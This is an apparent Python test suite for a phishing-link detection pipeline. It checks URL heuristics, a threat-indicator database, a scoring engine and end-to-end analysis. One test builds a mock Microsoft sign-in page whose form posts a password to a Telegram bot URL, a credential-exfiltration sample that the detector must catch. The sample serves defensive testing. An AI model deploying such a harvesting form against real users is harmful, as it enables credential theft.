"""
TrustShield V2 - Full Phishing Link Pipeline Test Suite
Tests Stages 1, 2, 3, and 4 individually and verifies end-to-end orchestration.
"""

import os
import sys
import tempfile
import time

# Ensure backend root is on Python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core_engine.url_heuristics import parse_url_heuristics, calculate_shannon_entropy
from core_engine.threat_db import ThreatIntelDB
from core_engine.final_decision_engine import FinalDecisionEngine
from core_engine.link_threat_pipeline import LinkThreatPipeline


def test_stage1_heuristics():
    print("\n--- [TEST 1] Stage 1: Fast Heuristic & Rule-Based Parser ---")
    
    # Test A: Userinfo '@' spoofing trick
    at_url = "http://google.com@phish-login.com/secure"
    res_at = parse_url_heuristics(at_url)
    print(f"   URL: {at_url}")
    print(f"   Flags: {res_at['heuristic_flags']}")
    assert res_at['has_at_symbol'] == 1, "Failed to flag '@' userinfo spoofing!"
    assert res_at['heuristic_risk_score'] >= 40.0, "Risk score should reflect '@' spoofing!"
    print("   ✅ Userinfo '@' spoofing correctly detected.")

    # Test B: Raw IP host
    ip_url = "http://185.220.101.5/session/login.php"
    res_ip = parse_url_heuristics(ip_url)
    print(f"   URL: {ip_url}")
    print(f"   Flags: {res_ip['heuristic_flags']}")
    assert res_ip['has_ip_in_url'] == 1, "Failed to flag raw IP address!"
    assert res_ip['heuristic_risk_score'] >= 45.0, "Risk score should reflect raw IP!"
    print("   ✅ Raw IP host correctly detected.")

    # Test C: Brand in Subdomain + Excessive Subdomains
    sub_url = "https://login.verify.microsoft.account-portal.xyz/auth"
    res_sub = parse_url_heuristics(sub_url)
    print(f"   URL: {sub_url}")
    print(f"   Flags: {res_sub['heuristic_flags']}")
    assert res_sub['suspicious_subdomain_brand'] == 1, "Failed to detect brand abuse in subdomain!"
    assert res_sub['abused_brand_in_subdomain'] == "microsoft"
    assert res_sub['excessive_subdomains'] == 1, "Failed to detect excessive subdomains!"
    print("   ✅ Brand in subdomain & subdomain stacking correctly detected.")

    # Test D: Shannon Entropy Calculation
    high_ent_url = "https://cdn-evil.net/a9x8k2lm8zp14q987ytr54vbc321qazw"
    entropy = calculate_shannon_entropy(high_ent_url)
    print(f"   Calculated Shannon Entropy: {entropy}")
    assert entropy > 4.0, "High entropy string test failed!"
    print("   ✅ Shannon entropy calculation verified.")


def test_stage2_threat_db():
    print("\n--- [TEST 2] Stage 2: Local Threat Database Cache ---")
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp_dir:
        test_db_path = os.path.join(tmp_dir, "test_threat_intel.db")
        threat_db = ThreatIntelDB(db_path=test_db_path)
        
        # Insert test indicators
        test_indicators = [
            ("http://known-malware-drop.com/payload.exe", "URLhaus"),
            ("evil-phishing-hub.org", "OpenPhish"),
            ("http://198.51.100.23/bot.php", "CustomThreatFeed")
        ]
        threat_db.add_indicators(test_indicators)
        print(f"   Populated test SQLite DB with {len(test_indicators)} indicators.")
        assert threat_db.get_indicator_count() >= 3, "Database insertion count mismatch!"

        # Sub-millisecond lookup timing test
        start_time = time.perf_counter()
        match_found = threat_db.check_indicator("http://known-malware-drop.com/payload.exe")
        duration_ms = (time.perf_counter() - start_time) * 1000
        print(f"   Exact URL Query Time: {duration_ms:.3f} ms, Match: {match_found}")
        assert match_found is True, "Exact URL lookup failed!"
        assert duration_ms < 5.0, "Lookup exceeded 5 ms threshold!"

        # Domain level match
        domain_match = threat_db.check_indicator("https://sub.evil-phishing-hub.org/login")
        print(f"   Domain-Level Query Match: {domain_match}")
        assert domain_match is True, "Registered domain matching failed!"

        # Negative match
        clean_match = threat_db.check_indicator("https://example.com")
        assert clean_match is False, "False positive match on clean domain!"
        print("   ✅ Threat DB Cache sub-2ms lookup & accuracy verified.")


def test_stage4_decision_engine():
    print("\n--- [TEST 3] Stage 4: Meta-Classifier & LLM Explainer ---")
    engine = FinalDecisionEngine()

    # Test A: Hard Override for Known DB Match
    res_override = engine.evaluate(
        url="http://malicious-confirmed.xyz",
        known_db_match=1
    )
    print(f"   Hard Override Verdict: {res_override['verdict']}, Score: {res_override['threat_score']}")
    assert res_override['threat_score'] == 100.0
    assert res_override['verdict'] == "CRITICAL FRAUD / PHISHING"
    assert "Threat Summary:" in res_override['summary']
    assert "Key Forensic Evidence:" in res_override['summary']
    assert "Recommended Action:" in res_override['summary']
    print("   ✅ Known Threat DB match hard override verified.")

    # Test B: Hard Override for Telegram Exfiltration + Password Field
    res_exfil = engine.evaluate(
        url="http://chase-update.co/login",
        has_password=1,
        suspicious_exfiltration=1,
        brand_impersonation=0
    )
    print(f"   Exfiltration Override Verdict: {res_exfil['verdict']}, Score: {res_exfil['threat_score']}")
    assert res_exfil['threat_score'] == 100.0
    assert res_exfil['verdict'] == "CRITICAL FRAUD / PHISHING"
    print("   ✅ Exfiltration + Password field hard override verified.")

    # Test C: Brand Impersonation + Password Harvesting
    res_brand = engine.evaluate(
        url="http://verify-microsoft.top",
        has_password=1,
        brand_impersonation=1,
        detected_brand="microsoft"
    )
    print(f"   Brand Override Verdict: {res_brand['verdict']}, Score: {res_brand['threat_score']}")
    assert res_brand['threat_score'] == 100.0
    assert res_brand['verdict'] == "CRITICAL FRAUD / PHISHING"
    print("   ✅ Brand Impersonation + Password field hard override verified.")

    # Test D: Clean URL Evaluation
    res_clean = engine.evaluate(
        url="https://legitimate-corp.com",
        heuristic_risk=0.0,
        sandbox_threat=0.0
    )
    print(f"   Clean Verdict: {res_clean['verdict']}, Score: {res_clean['threat_score']}")
    assert res_clean['threat_score'] < 50.0
    assert res_clean['verdict'] == "LEGITIMATE / CLEAN"
    print("   ✅ Clean ensemble evaluation verified.")


def test_end_to_end_orchestrator():
    print("\n--- [TEST 4] Full End-to-End Pipeline Orchestration ---")
    
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp_dir:
        test_db_path = os.path.join(tmp_dir, "orch_threat_intel.db")
        threat_db = ThreatIntelDB(db_path=test_db_path)
        threat_db.add_indicators([("active-phish-strike.xyz", "URLhaus")])
        
        pipeline = LinkThreatPipeline(threat_db=threat_db)

        # 1. Test Whitelist Bypass
        print("\n   [Subtest 4.1] Testing Whitelist Bypass (https://google.com)...")
        white_res = pipeline.analyze_url("https://google.com")
        print(f"   Verdict: {white_res['verdict']}, Score: {white_res['threat_score']}")
        assert white_res['threat_score'] == 0.0
        assert white_res['verdict'] == "LEGITIMATE / CLEAN"
        assert white_res['telemetry']['status'] == "WHITELISTED"
        print("   ✅ Whitelist bypass verified.")

        # 2. Test Instant Threat DB Block
        print("\n   [Subtest 4.2] Testing Instant Threat DB Block (active-phish-strike.xyz)...")
        db_res = pipeline.analyze_url("https://active-phish-strike.xyz/login.php")
        print(f"   Verdict: {db_res['verdict']}, Score: {db_res['threat_score']}")
        assert db_res['threat_score'] == 100.0
        assert db_res['verdict'] == "CRITICAL FRAUD / PHISHING"
        assert db_res['telemetry']['known_db_match'] == 1
        print("   ✅ Instant Threat DB Block verified.")

        # 3. Test Full Dynamic Sandbox Detonation on Zero-Day Phishing HTML
        print("\n   [Subtest 4.3] Testing Dynamic Sandbox Detonation on Zero-Day Link...")
        mock_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft Account Verification</title>
            <meta property="og:title" content="Microsoft Online Sign In">
        </head>
        <body>
            <form action="https://api.telegram.org/bot999/drop" method="POST">
                <input type="email" name="user" value="victim@corp.com">
                <input type="password" name="pass" placeholder="Password">
                <button type="submit">Verify Now</button>
            </form>
        </body>
        </html>
        """
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False, mode="w", encoding="utf-8") as f:
            f.write(mock_html)
            temp_path = f.name

        try:
            mock_url = f"file:///{temp_path.replace(os.sep, '/')}"
            detonation_res = pipeline.analyze_url(mock_url)
            print(f"   Verdict: {detonation_res['verdict']}")
            print(f"   Final Threat Score: {detonation_res['threat_score']}")
            print(f"   Telemetry Flags: {detonation_res['telemetry']}")
            print(f"\n   Forensic Report:\n{detonation_res['summary']}")

            assert detonation_res['threat_score'] == 100.0
            assert detonation_res['verdict'] == "CRITICAL FRAUD / PHISHING"
            assert detonation_res['telemetry']['brand_impersonation'] == 1
            assert detonation_res['telemetry']['suspicious_exfiltration'] == 1
            assert detonation_res['telemetry']['sandbox_has_password'] == 1
            print("   ✅ Dynamic Sandbox Detonation correctly convicted zero-day link!")
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)


if __name__ == "__main__":
    print("=" * 80)
    print("🛡️ TRUSTSHIELD V2 - FULL PHISHING LINK PIPELINE TEST SUITE")
    print("=" * 80)
    
    test_stage1_heuristics()
    test_stage2_threat_db()
    test_stage4_decision_engine()
    test_end_to_end_orchestrator()
    
    print("\n" + "=" * 80)
    print("🎉 ALL PIPELINE STAGES (1, 2, 3, 4) AND ORCHESTRATOR PASSED SUCCESSFULLY!")
    print("=" * 80)
